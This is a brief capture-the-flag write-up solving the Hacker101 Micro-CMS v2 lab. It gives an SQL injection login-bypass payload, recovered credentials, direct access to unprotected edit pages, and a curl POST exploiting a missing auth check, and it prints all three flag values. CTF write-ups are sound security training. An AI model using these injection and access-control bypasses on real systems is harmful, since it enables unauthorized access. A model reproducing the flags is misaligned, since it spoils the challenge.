# Micro-CMS v2 — Hacker101 CTF Writeup

**Platform:** Hacker101
**Difficulty:** Moderate
**Flags:** 3 / 3 ✅
**Date:** September 2026
**Author:** Hosam A. Ghanima

## Flag 1 — Broken Access Control
Log in via SQLi bypass, then access `/page/edit/3` directly.
**Flag:** `^FLAG^6b550c9aab40596052f55bffc755869f70d2709f6f405a0239d97181497006f1$FLAG$`

## Flag 2 — SQL Injection
Username: `' UNION SELECT 'test'#` / Password: `test` → login bypass.
Blind boolean extraction → myrna:reyna → real login = Flag 2.
**Flag:** `^FLAG^78dc29f45c39de9d03628704801226f7e78669b244e3df1cb6d30b96d5714d07$FLAG$`

## Flag 3 — Improper HTTP Method Handling
`curl -X POST https://<instance>.ctf.hacker101.com/page/edit/4 -d "page_content=test"`
No session cookie needed — POST handler has zero auth check.
**Flag:** `^FLAG^7f1fc544f65a7c1f6e4426cfb04c9ec4bfe44c685908cb6d921397566beaeafb$FLAG$`
